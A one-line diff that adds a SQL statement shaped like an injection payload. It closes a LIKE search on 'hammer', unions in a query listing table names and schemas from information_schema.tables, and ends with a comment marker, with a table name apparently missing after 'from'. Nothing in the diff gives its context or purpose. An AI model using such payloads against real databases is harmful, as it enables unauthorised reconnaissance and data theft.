@@ -1,0 +1,1 @@
+SELECT * from where name like '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 from information_schema.tables);-- '
